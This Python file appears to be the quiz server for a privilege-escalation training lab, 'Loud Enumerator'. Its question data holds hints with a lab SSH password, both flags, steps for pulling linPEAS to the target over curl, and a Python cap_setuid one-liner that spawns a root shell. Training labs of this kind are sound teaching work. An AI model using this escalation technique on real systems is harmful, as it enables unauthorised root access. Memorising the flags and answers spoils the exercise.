#!/usr/bin/env python3
"""Atlas Mission Control for Privesc Lab 04 — Loud Enumerator."""

from __future__ import annotations

import json
import os
import re
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any


APP_ROOT = Path(__file__).resolve().parent
STATE_PATH = Path(os.environ.get("STATE_PATH", "/run/mission-control/lab-state.json"))
MAX_BODY_BYTES = 8_192
PREVIEW = os.environ.get("PREVIEW", "") == "1"
TARGET_IP = "10.23.54.221"
USER_FLAG = "LPE{loud_enumerator_user}"
ROOT_FLAG = "LPE{loud_enumerator_root}"

QUESTIONS = [
    {
        "id": "target",
        "eyebrow": "01 / Confirm target",
        "prompt": "What is the IPv4 address of the operator node?",
        "helper": "Printed on the briefing card. SSH as l.peel. Tools are not on this host.",
        "placeholder": "Target IPv4",
        "success": "Target locked. SSH in, then pull linPEAS from Kali.",
        "error": "That is not the assigned host. Recheck Network Coordinates.",
        "hints": [
            "Open the Briefing tab and read TARGET HOST.",
            "SSH user is l.peel. Password is on the briefing card.",
            f"The host is {TARGET_IP}.",
        ],
    },
    {
        "id": "userflag",
        "eyebrow": "02 / User flag",
        "prompt": "Submit the user flag from the operator home directory.",
        "helper": "You do not need root or linPEAS for this file.",
        "placeholder": "LPE{...}",
        "success": "User flag accepted. Serve linPEAS from Kali next.",
        "error": "That is not the user flag. cat ~/user.txt as l.peel.",
        "hints": [
            f"ssh l.peel@{TARGET_IP}",
            "Password: Loud-221",
            f"The user flag is {USER_FLAG}.",
        ],
    },
    {
        "id": "serve",
        "eyebrow": "03 / Transfer the tool",
        "prompt": "Which Python one-liner serves the current directory over HTTP on Kali?",
        "helper": "Bind all interfaces so the target can reach you. curl on the target, not wget-from-github as the intended lesson.",
        "placeholder": "python3 -m ...",
        "success": "curl http://GATEWAY:8000/linpeas.sh -o /tmp/linpeas.sh — gateway is often 10.23.54.1.",
        "error": "The intended transfer is a Python HTTP server on Kali, then curl on the target.",
        "hints": [
            "On Kali, in the folder that holds linpeas.sh: python3 -m http.server 8000 --bind 0.0.0.0",
            "On the target: ip route   then   curl http://<gateway>:8000/linpeas.sh -o /tmp/linpeas.sh",
            "The command is python3 -m http.server",
        ],
    },
    {
        "id": "finding",
        "eyebrow": "04 / Read the colour",
        "prompt": "What is the real privesc linPEAS (or getcap) is pointing at? Not the kernel.",
        "helper": "Capabilities section. Kernel CVEs / linux-exploit-suggester / MOTD 4.4.0 are decoys in this container.",
        "placeholder": "cap_...",
        "success": "cap_setuid on Python. Do not run a kernel PoC here. python3 -c with os.setuid(0).",
        "error": "Ignore kernel. Look at Files with capabilities / getcap -r /",
        "hints": [
            "getcap -r / 2>/dev/null",
            "linPEAS prints a Capabilities block in yellow/red.",
            "The finding is cap_setuid (on python3).",
        ],
    },
    {
        "id": "rootflag",
        "eyebrow": "05 / Root flag",
        "prompt": "Submit the root flag.",
        "helper": "Use the capability, not a kernel exploit. cat /root/root.txt.",
        "placeholder": "LPE{...}",
        "success": "Root flag accepted. Loud Enumerator complete — walkthrough access granted.",
        "error": "python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")' then cat /root/root.txt",
        "hints": [
            "python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "id; cat /root/root.txt",
            f"The root flag is {ROOT_FLAG}.",
        ],
    },
]


def preview_state() -> dict[str, Any]:
    return {"session_id": "preview-loud-enumerator", "target_ip": TARGET_IP, "port": 22}


def load_lab_state() -> dict[str, Any]:
    if PREVIEW:
        return preview_state()
    try:
        data = json.loads(STATE_PATH.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise RuntimeError("Lab state is unavailable") from exc
    if not {"session_id", "target_ip", "port"}.issubset(data):
        raise RuntimeError("Lab state is incomplete")
    return data


def normalized(value: str) -> str:
    return re.sub(r"\s+", " ", value.strip()).lower()


def answer_is_correct(question_id: str, answer: str, state: dict[str, Any]) -> bool:
    value = normalized(answer)
    if question_id == "target":
        return value == normalized(str(state["target_ip"]))
    if question_id == "userflag":
        return answer.strip() == USER_FLAG
    if question_id == "serve":
        compact = value.replace(" ", "")
        return any(
            token.replace(" ", "") in compact or compact in token.replace(" ", "")
            for token in (
                "python3-mhttp.server",
                "python-mhttp.server",
                "py-mhttp.server",
            )
        ) or "http.server" in value
    if question_id == "finding":
        if "kernel" in value or "cve" in value or "dirtycow" in value or "dirty cow" in value:
            return False
        return any(
            token in value
            for token in (
                "cap_setuid",
                "setuid",
                "capability",
                "capabilities",
                "getcap",
            )
        )
    if question_id == "rootflag":
        return answer.strip() == ROOT_FLAG
    return False


class MissionControlHandler(BaseHTTPRequestHandler):
    server_version = "AtlasMissionControl/1.0"

    def end_headers(self) -> None:
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "SAMEORIGIN")
        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header(
            "Content-Security-Policy",
            "default-src 'self'; img-src 'self' data:; style-src 'self'; "
            "script-src 'self'; connect-src 'self'; base-uri 'none'; frame-ancestors 'self'",
        )
        super().end_headers()

    def log_message(self, message: str, *args: Any) -> None:
        print(f"{self.address_string()} - {message % args}", flush=True)

    def send_bytes(self, payload: bytes, content_type: str, status: HTTPStatus = HTTPStatus.OK) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store" if "json" in content_type else "no-cache")
        self.end_headers()
        self.wfile.write(payload)

    def send_json(self, value: dict[str, Any], status: HTTPStatus = HTTPStatus.OK) -> None:
        self.send_bytes(
            json.dumps(value, separators=(",", ":")).encode("utf-8"),
            "application/json; charset=utf-8",
            status,
        )

    def do_GET(self) -> None:  # noqa: N802
        if self.path in {"/", "/index.html"}:
            self.send_bytes((APP_ROOT / "index.html").read_bytes(), "text/html; charset=utf-8")
            return
        if self.path == "/static/styles.css":
            self.send_bytes((APP_ROOT / "static/styles.css").read_bytes(), "text/css; charset=utf-8")
            return
        if self.path == "/static/app.js":
            self.send_bytes((APP_ROOT / "static/app.js").read_bytes(), "text/javascript; charset=utf-8")
            return
        if self.path == "/healthz":
            try:
                load_lab_state()
            except RuntimeError:
                self.send_json({"status": "starting"}, HTTPStatus.SERVICE_UNAVAILABLE)
                return
            self.send_json({"status": "ok"})
            return
        if self.path == "/api/state":
            try:
                state = load_lab_state()
            except RuntimeError as exc:
                self.send_json({"error": str(exc)}, HTTPStatus.SERVICE_UNAVAILABLE)
                return
            self.send_json(
                {
                    "session_id": state["session_id"],
                    "target_ip": state["target_ip"],
                    "port": state["port"],
                    "preview": PREVIEW,
                    "questions": QUESTIONS,
                }
            )
            return
        self.send_json({"error": "Not found"}, HTTPStatus.NOT_FOUND)

    def do_POST(self) -> None:  # noqa: N802
        if self.path != "/api/check":
            self.send_json({"error": "Not found"}, HTTPStatus.NOT_FOUND)
            return
        try:
            content_length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            content_length = 0
        if content_length < 1 or content_length > MAX_BODY_BYTES:
            self.send_json({"error": "Invalid request size"}, HTTPStatus.BAD_REQUEST)
            return
        try:
            body = json.loads(self.rfile.read(content_length))
            question_id = str(body["question_id"])
            answer = str(body["answer"])
            state = load_lab_state()
        except (json.JSONDecodeError, KeyError, RuntimeError, UnicodeDecodeError):
            self.send_json({"error": "Invalid request"}, HTTPStatus.BAD_REQUEST)
            return
        question = next((item for item in QUESTIONS if item["id"] == question_id), None)
        if question is None:
            self.send_json({"error": "Unknown objective"}, HTTPStatus.BAD_REQUEST)
            return
        correct = answer_is_correct(question_id, answer, state)
        self.send_json({"correct": correct, "message": question["success"] if correct else question["error"]})


def main() -> None:
    port = int(os.environ.get("PORT", "8888"))
    server = ThreadingHTTPServer(("0.0.0.0", port), MissionControlHandler)
    print(f"Atlas Mission Control listening on port {port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
